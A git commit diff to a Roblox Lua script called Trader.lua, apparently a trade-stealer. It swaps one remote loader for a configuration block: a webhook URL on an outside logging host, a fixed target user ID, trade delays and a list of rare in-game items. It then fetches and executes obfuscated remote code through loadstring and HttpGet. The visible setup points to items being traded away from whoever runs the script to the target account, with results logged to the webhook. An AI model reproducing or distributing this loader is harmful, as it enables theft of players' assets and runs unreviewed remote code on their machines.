059b15b6a73be7c305a5b58d3ddcf3a29bb8f242
zener2000 <adrianflash.zener@gmail.com>
2026-02-27 21:45:01 +0100

    Update Trader.lua

--- Trader.lua
+++ Trader.lua
@@ -1,3 +1,38 @@
-loadstring(game:HttpGet("https://pastefy.app/ShsXK0b8/raw"))()
-
-
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_69201cb343644b71a9b62af1bbad7be2"
+getgenv().TARGET_ID = 7687372922
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Burguro And Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Cerberus"] = true,
+    ["Cooki and Milki"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Festive 67"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Garama and Madundung"] = true,
+    ["Ginger Gerat"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Ketupat Bros"] = true,
+    ["Ketupat Kepat"] = true,
+    ["La Casa Boo"] = true,
+    ["La Romantic Grande"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Meowl"] = true,
+    ["Money Money Puggy"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Tictac Sahur"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
